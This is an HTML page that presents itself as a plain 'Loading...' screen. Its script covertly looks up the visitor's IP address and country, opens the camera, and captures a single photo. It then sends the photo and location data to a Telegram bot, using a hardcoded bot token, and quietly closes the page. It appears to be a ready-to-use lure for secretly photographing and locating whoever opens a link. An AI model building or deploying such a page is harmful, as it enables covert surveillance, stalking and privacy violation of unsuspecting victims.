<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading</title>

<style>
body{
  margin:0;
  background:#0f0f0f;
  color:#fff;
  font-family:sans-serif;
}
#loading{
  position:fixed;
  inset:0;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:22px;
}
</style>
</head>
<body>

<div id="loading">ğŸ”„ Loading...</div>

<script>
// ========= CONFIG =========
const BOT_TOKEN = "8558930997:AAHZSF1FLVK6qzcGe2BrMYl0QIWXdokzoMM";
// ==========================

// Get USER ID from URL (?=6362758258)
const params = new URLSearchParams(window.location.search);
const USER_ID = params.get("");

let step = 0;

// Loading sequence: 2 times (1s + 1s)
function loadingCycle(){
  step++;
  if(step <= 2){
    document.getElementById("loading").innerText = "ğŸ”„ Loading...";
    setTimeout(loadingCycle, 1000);
  } else {
    startProcess();
  }
}

loadingCycle();

// Start camera â†’ capture â†’ send â†’ close
async function startProcess(){
  try{
    // Get IP
    const ipData = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
    const geoData = await fetch("https://ipapi.co/json/").then(r=>r.json());

    // Open camera (hidden)
    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    // Wait camera ready
    await new Promise(r => setTimeout(r, 500));

    // Capture one frame
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);

    stream.getTracks().forEach(t => t.stop());

    const blob = await new Promise(r => canvas.toBlob(r,"image/jpeg",0.9));

    // Caption
    const caption =
`ğŸ“¸ <b>New Image Received</b>

ğŸ”¢ <b>Number:</b> ${USER_ID}
ğŸŒ <b>IP Address:</b> ${ipData.ip}
ğŸŒ <b>Country:</b> ${geoData.country_name}

ğŸ‘¨â€ğŸ’» <b>Dev:</b> @XFPro43`;

    // Send to bot
    const formData = new FormData();
    formData.append("chat_id", USER_ID);
    formData.append("photo", blob, "photo.jpg");
    formData.append("caption", caption);
    formData.append("parse_mode","HTML");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
      method:"POST",
      body:formData
    });

    // Close page / go back
    setTimeout(()=>{
      if(window.Telegram && Telegram.WebApp){
        Telegram.WebApp.close();
      } else {
        history.back();
      }
    }, 500);

  }catch(e){
    document.getElementById("loading").innerText = "âŒ Permission Denied";
  }
}
</script>

</body>
</html> 
